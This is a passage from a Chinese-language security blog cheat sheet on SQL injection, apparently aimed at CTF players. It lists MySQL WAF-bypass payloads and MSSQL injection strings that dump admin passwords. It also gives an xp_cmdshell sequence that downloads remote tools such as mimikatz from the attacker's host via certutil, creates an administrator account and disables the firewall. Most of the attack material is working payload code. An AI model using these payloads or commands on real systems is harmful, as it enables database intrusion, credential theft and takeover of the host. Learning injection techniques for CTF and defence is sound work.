class="hljs-number">2</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h3><h4 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h4><p>对于针对替换关键字的绕过，我们可以使用双写关键字来绕过，例如<code>uniunionon</code></p><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> b=<span class="hljs-number">0x32</span>;</span><br><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> b=<span class="hljs-built_in">char</span>(<span class="hljs-number">0x32</span>);</span><br><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> yz <span class="hljs-keyword">where</span> b=<span class="hljs-built_in">char</span>(<span class="hljs-number">0x67</span>)+<span class="hljs-built_in">char</span>(<span class="hljs-number">0x75</span>)+<span class="hljs-built_in">char</span>(<span class="hljs-number">0x65</span>)+<span class="hljs-built_in">char</span>(<span class="hljs-number">0x73</span>)+<span class="hljs-built_in">char</span>(<span class="hljs-number">0x74</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">"users"</span></span><br><span class="line"><span class="hljs-keyword">select</span> column_name  <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">SELECT</span>(extractvalue(<span class="hljs-number">0x3C613E61646D696E3C2F613E</span>,<span class="hljs-number">0x2f61</span>))</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>即<span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%72</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%31</span><span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%31</span>，而Test也可以为CHAR(<span class="hljs-number">101</span>)+CHAR(<span class="hljs-number">97</span>)+CHAR(<span class="hljs-number">115</span>)+CHAR(<span class="hljs-number">116</span>)。</span><br><span class="line"></span><br><span class="line">双重编码绕过</span><br><span class="line"></span><br><span class="line">?id=<span class="hljs-number">1</span><span class="hljs-symbol">%252</span>f<span class="hljs-symbol">%252</span>a*/UNION<span class="hljs-symbol">%252</span>f<span class="hljs-symbol">%252</span>a /SELECT<span class="hljs-symbol">%252</span>f<span class="hljs-symbol">%252</span>a*/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,password<span class="hljs-symbol">%252</span>f<span class="hljs-symbol">%252</span>a*/FROM<span class="hljs-symbol">%252</span>f<span class="hljs-symbol">%252</span>a*/Users--+</span><br><span class="line"></span><br><span class="line">一些unicode编码举例：    </span><br><span class="line">单引号：'</span><br><span class="line"><span class="hljs-symbol">%u0027</span> <span class="hljs-symbol">%u02b9</span> <span class="hljs-symbol">%u02bc</span></span><br><span class="line"><span class="hljs-symbol">%u02c8</span> <span class="hljs-symbol">%u2032</span></span><br><span class="line"><span class="hljs-symbol">%uff07</span> <span class="hljs-symbol">%c0</span><span class="hljs-symbol">%27</span></span><br><span class="line"><span class="hljs-symbol">%c0</span><span class="hljs-symbol">%a7</span> <span class="hljs-symbol">%e0</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%a7</span></span><br><span class="line">空白：</span><br><span class="line"><span class="hljs-symbol">%u0020</span> <span class="hljs-symbol">%uff00</span></span><br><span class="line"><span class="hljs-symbol">%c0</span><span class="hljs-symbol">%20</span> <span class="hljs-symbol">%c0</span><span class="hljs-symbol">%a0</span> <span class="hljs-symbol">%e0</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%a0</span></span><br><span class="line">左括号(:</span><br><span class="line"><span class="hljs-symbol">%u0028</span> <span class="hljs-symbol">%uff08</span></span><br><span class="line"><span class="hljs-symbol">%c0</span><span class="hljs-symbol">%28</span> <span class="hljs-symbol">%c0</span><span class="hljs-symbol">%a8</span></span><br><span class="line"><span class="hljs-symbol">%e0</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%a8</span></span><br><span class="line">右括号):</span><br><span class="line"><span class="hljs-symbol">%u0029</span> <span class="hljs-symbol">%uff09</span></span><br><span class="line"><span class="hljs-symbol">%c0</span><span class="hljs-symbol">%29</span> <span class="hljs-symbol">%c0</span><span class="hljs-symbol">%a9</span></span><br><span class="line"><span class="hljs-symbol">%e0</span><span class="hljs-symbol">%80</span><span class="hljs-symbol">%a9</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h4><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mid(user() from 1 for 1)</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">substr</span>(<span class="hljs-keyword">user</span>()<span class="hljs-keyword">from</span> <span class="hljs-number">-1</span>) <span class="hljs-keyword">from</span> yz ;</span><br><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>(<span class="hljs-keyword">user</span>() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)) &lt; <span class="hljs-number">150</span>;</span><br><span class="line"></span><br><span class="line">同时也可以利用替换函数</span><br><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>)&gt;<span class="hljs-string">'tf'</span>;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="比较符号绕过"><a href="#比较符号绕过" class="headerlink" title="比较符号绕过"></a>比较符号绕过</h4><p>过滤了<code>&gt;</code>或者<code>&lt;</code>，我们可以用<code>greatest</code>或者<code>least</code></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">greatest(ascii(mid(user(),0,1)),150)</span><br><span class="line">least(ascii(mid(user(),0,1)),150)</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="字符串比较函数"><a href="#字符串比较函数" class="headerlink" title="字符串比较函数"></a>字符串比较函数</h4><ul><li>strcmp(expr1,expr2) 如果两个字符串是一样则返回 0 ，如果第一个小于第二个则返回 -1</li><li>find_in_set(str,strlist) 如果相同则返回 1，不同则返回 0</li></ul><h4 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h4><ul><li>concat(str1,str2) 将字符串首尾相连</li><li>concat_ws(separator,str1,str2) 将字符串用指定连接符连接</li><li>group_concat()</li></ul><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p></p><figure class="highlight markdown hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-bullet">+ </span>- * /</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">= &lt;&gt; != &gt; &lt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>between<ul><li>select database() between 0x61 and 0x7a;</li><li>select database() between ‘a’ and ‘z’;</li></ul></li><li>in<ul><li>select ‘123’ in (‘12’) =&gt; 0</li></ul></li><li>Like(模糊匹配)<ul><li>select ‘12345’ like ‘12%’ =&gt; true</li></ul></li><li>regexp 或 rlike(正则匹配)<ul><li>select ‘123455’ regexp ‘^12’ =&gt; true</li></ul></li></ul><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p></p><figure class="highlight mipsasm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not或! 非  </span><br><span class="line"><span class="hljs-keyword">AND </span>逻辑与 == &amp;&amp;</span><br><span class="line"><span class="hljs-keyword">OR </span>逻辑或 == <span class="hljs-title">||</span></span><br><span class="line"><span class="hljs-keyword">XOR </span>逻辑异或 == ^</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p></p><figure class="highlight 1c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&amp; 按位与</span></span><br><span class="line"><span class="hljs-string">| 按位或</span></span><br><span class="line">^ 按位异或</span><br><span class="line">! 取反</span><br><span class="line">&lt;&lt; 左移</span><br><span class="line">&gt;&gt;右移</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="noopener">当表名可控的注入遇到了Describe时的几种情况</a></p><p><a href="https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener">MySQL Error Based SQL Injection （报错注入）总结</a></p><p><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="noopener">MySql注入备忘录</a></p><p><a href="http://p0desta.com/2018/03/29/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/" target="_blank" rel="noopener">SQL注入备忘录</a></p><p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">SQL注入绕过技巧</a></p><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><h2 id="Basic-1"><a href="#Basic-1" class="headerlink" title="Basic"></a>Basic</h2><h3 id="系统库"><a href="#系统库" class="headerlink" title="系统库"></a>系统库</h3><table><thead><tr><th>系统数据库</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/master-database?view=sql-server-2017" target="_blank" rel="noopener">master 数据库</a></td><td>记录 SQL Server实例的所有系统级信息。这个数据库包括所有的配置信息、用户登录信息、当前正在服务器中运行的进程的信息。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/msdb-database?view=sql-server-2017" target="_blank" rel="noopener">msdb 数据库</a></td><td>用于 SQL Server 代理计划警报和作业。msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一 个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/model-database?view=sql-server-2017" target="_blank" rel="noopener">model 数据库</a></td><td>用作 SQL Server实例上创建的所有数据库的模板。 对 <strong>model</strong> 数据库进行的修改（如数据库大小、排序规则、恢复模式和其他数据库选项）将应用于以后创建的所有数据库。model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/resource-database?view=sql-server-2017" target="_blank" rel="noopener">Resource 数据库</a></td><td>一个只读数据库，包含 SQL Server包括的系统对象。 系统对象在物理上保留在 <strong>Resource</strong> 数据库中，但在逻辑上显示在每个数据库的 <strong>sys</strong> 架构中。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/databases/tempdb-database?view=sql-server-2017" target="_blank" rel="noopener">tempdb 数据库</a></td><td>一个工作空间，用于保存临时对象或中间结果集。tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到 tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建◊永远不要在tempdb数据库建立需要永久保存的表。</td></tr></tbody></table><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><table><thead><tr><th>参数</th><th>风格</th></tr></thead><tbody><tr><td>/*</td><td>C语言风格</td></tr><tr><td>–</td><td>SQL注释风格</td></tr><tr><td>;%00</td><td>空字节</td></tr></tbody></table><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><h4 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@SERVERNAME;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@VERSION</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select db_name()</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="数据库ip地址"><a href="#数据库ip地址" class="headerlink" title="数据库ip地址"></a>数据库ip地址</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select local_net_address from sys.dm_exec_connextions where Session_id=@@spid</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="暴当前表中的列"><a href="#暴当前表中的列" class="headerlink" title="暴当前表中的列"></a>暴当前表中的列</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">article.asp?id=6 group by admin.username having 1=1--</span><br><span class="line">article.asp?id=6 group by admin.username,admin.password having 1=1--</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="暴任意表和列"><a href="#暴任意表和列" class="headerlink" title="暴任意表和列"></a>暴任意表和列</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1</span><br><span class="line">and (select top col_name(object_id('admin'),N) from sysobjects)&gt;1</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="暴数据库数据"><a href="#暴数据库数据" class="headerlink" title="暴数据库数据"></a>暴数据库数据</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 password from admin where id=N)&gt;1</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Exmaples"><a href="#Exmaples" class="headerlink" title="Exmaples"></a>Exmaples</h4><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">query: SELECT username, password FROM Users WHERE id = '1';</span><br><span class="line">1' HAVING 1=1                                       -- 错误</span><br><span class="line">1' GROUP BY username HAVING 1=1--                   -- 错误</span><br><span class="line">1' GROUP BY username, password HAVING 1=1--         -- 正确</span><br><span class="line">Group By可以用来测试列名</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --先执行一次刷新，处理上次的配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure 'show advanced options',1 --启用xp_cmdshell的高级配置</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --刷新配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure 'xp_cmdshell',1  --打开xp_cmdshell,可以调用SQL系统之外的命令</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">--使用xp_cmdshell在D盘创建一个myfile 文件夹</span><br><span class="line">EXEC xp_cmdshell 'mkdir d:\myfile',no_output --[no_output]表示是否输出信息</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">sp_configure 'show advanced options',1; (记得reconfigure) </span><br><span class="line"></span><br><span class="line">sp_configure 'xp_cmdshell',1;（记得reconfigure）启用xp_cmdshell</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'dir c:\ /s /b |findstr "key"|findstr "txt"'; 找到key的位置</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'type key位置"'; 直接读key内容，不过一般不会让你有直接读的权限</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'cacls c:\ /s /b |findstr "key"|findstr "txt" /E /G adminstrator:F'; 改变文件操作权限，F是所有权限，改变权限后再读就能成功</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/3389.exe'; 这里的certutil的方式与基础题4中的curl思路相同，可参考。这里上传的是开启3389的工具。</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';创建账户</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'netsh firewall set opmode disable'; 如果目标开了防火墙，那么即使开启3389端口也无法连接，这条命令用于关闭防火墙。</span><br><span class="line"></span><br><span class="line">exec xp_cmdshell 'certutil -urlcache -f -split http://本机:8000/mimikazts.exe';如果不能建立账户，那么需要工具去破解系统账户的密码。这里使用的mimikazts。</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell ‘dir “C:\Documents and Settings\Administrator\桌面\” /A -D /B’</span><br><span class="line">exec xp_cmdshell ‘type “C:\Documents and Settings\Administrator\桌面\key.txt”‘</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.anquanke.com/post/id/86011" target="_blank" rel="noopener">【技术分享】MSSQL 注入攻击与防御</a></p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Sec/">#Sec</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/03/08/Web-For-Pentest/">Web For Pentest</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/03/04/Sqli-lab%20Challenges%20Write%20up/">Sqli-lab Challenges Write up</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var 